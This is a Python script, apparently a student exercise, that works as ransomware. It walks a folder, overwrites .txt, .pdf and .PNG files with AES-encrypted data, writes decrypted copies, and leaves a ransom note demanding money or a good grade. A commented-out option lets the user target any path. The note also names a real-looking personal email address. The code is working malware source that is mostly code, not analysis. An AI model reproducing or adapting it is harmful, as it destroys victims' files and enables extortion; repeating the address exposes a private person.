# Programa Ransomware definitivo
from Crypto.Cipher import AES
import os

# Generación de clave AES (32 bytes) y vector de inicialización (16 bytes)
key = os.urandom(32)
cipher = AES.new(key, AES.MODE_EAX)
iv = cipher.nonce

# Función para cifrar y sobrescribir el archivo
def encrypt_and_overwrite_file(key, iv, filename):
    total = os.path.getsize(filename)
    print(f'\t\t***INFO***[encrypt_and_overwrite_file]: Encrypted File ({total} bytes): {filename}\n')
    cipher = AES.new(key, AES.MODE_EAX, nonce=iv)
    try:
        fh = open(filename, 'rb+')
        while True:
            # Encrypt File Bytes
            data = fh.read(1024)
            if len(data) == 0:
                break
            #print(f'\t\t***INFO***[encrypt_and_overwrite_file]: Leído ({len(data)} bytes)')
            cipher_data = cipher.encrypt(data)
            #Write encrypted file
            fh.seek(-len(data), 1)
            fh.write(cipher_data)
            #print(f'\t\t***INFO***[encrypt_and_overwrite_file]: Escrito ({len(data)} bytes)')
        fh.close()
    except:
        print(f'\t\t***ERROR***[encrypt_and_overwrite_file]')

# Función para descifrar el archivo y guardarlo con el sufijo .decrypt
def decrypt_file(key, iv, filename):
    cipher = AES.new(key, AES.MODE_EAX, nonce=iv)
    dec_file = filename + ".decrypt"
    total = os.path.getsize(filename)
    print(f"\t\t***INFO*** [decrypt_file]: Decrypting File ({total} Bytes): {filename}")
    try:
        e_fh = open(filename, 'rb')
        d_fh = open(dec_file, 'wb')
        size = 0
        while True:
            # Decrypt File Bytes
            enc_data = e_fh.read(1024)
            #print(f"\t\t***INFO*** [decrypt_file]: Leido {enc_data}")
            if len(enc_data) == 0:
                break
            size += len(enc_data)
            dec_data = cipher.decrypt(enc_data) #Decrypt using AES Object
            # Write to decrypted file
            d_fh.write(dec_data)
            #print(f"\t\t***INFO*** [decrypt_file]: Escrito {dec_data}")
        e_fh.close()
        d_fh.close()
        print(f"\t\t***INFO*** [decrypt_file]: Decrypted File ({size} Bytes): {dec_file}\n")
    except:
        print(f'\t\t***ERROR***[decrypt_file]: Cannot decrypt file {filename}')
    
# Función para crear el archivo README.txt con mensaje
def ransom_note(directory):
    note = """
    Your files have been encrypted Juanra!
    These are your options:
    Option 1 : 
        Give me a very good grade on the exercise!!
    Option 2 :       
        Deposit one million euros into the following account:
            1234567890
        Once payment has been made, please contact the following email address: jgarciazud@educacion.navarra.es
    Option 3:        
        Stay with ransomware forever
    """
    try:
        readme_path = os.path.join(directory, "README.txt")
        f = open(readme_path, 'w')
        f.write(note)
        f.close()        
        print(f"\t\tThe Ransomware will generate a file asking for the Ransom and providing payment methods  Ransom README Fie generated: {readme_path}")
    except:
        print(f"***ERROR***[ransom_note]: Could not write note to {directory}")

# Configuración de los directorios y extensiones a cifrar
#ransom_dirs = [input("\033[33mPlease Enter a Path to Encrypt: \033[0m")] # Para que introduzcas la ruta de tu pc si te atreves (NO ME HAGO RESPONSABLE)
ransom_dirs = [r"C:\Users\Joseba\Desktop\ramsonware"]
ransom_exts = [".txt", ".pdf", ".PNG"]

# Paso 1: Mostrar información general
print("\033[33m***STEP 1***\033[0m")
print(f"This Ransomware will walk through the directories: {ransom_dirs}")
print(f"This Ransomware will encrypt ALL FILES with extensions {ransom_exts}\n")

# Paso 2: Mostrar la clave y el iv utilizados
print("\033[33m***STEP 2***\033[0m")
print("The Ransomware will use the following AES Encryption Key (32 bytes):")
print(f"{key}")
print("The Ransomware will use the following Initialization Vector (16 bytes):")
print(f"{iv}\n")

# Paso 3: Recorrer los directorios y cifrar los archivos
print("\033[33m***STEP 3***\033[0m")
print("The Ransomware will walk through the File System encrypting all target files")
for ransom_dir in ransom_dirs:
    print(f"\nWalking through the {ransom_dir} Directory to find {ransom_exts} files")
    for root, dirs, files in os.walk(ransom_dir):
        print(f"\n\tDirectory: {root}")
        for f in files:
            for ext in ransom_exts:
                if f.endswith(ext):
                    filename = os.path.join(root, f)
                    print(f"\t\tEncrypting File: {filename}")
                    # encrypt_file(key, iv, filename)
                    encrypt_and_overwrite_file(key, iv, filename)
                    print(f"\t\tDecrypting File: {filename}")
                    decrypt_file(key, iv, filename)
                    break
                
# Paso 4 llamar a la funcion crear nota   
print("\033[33m***STEP 4***\033[0m")  
ransom_note(ransom_dir)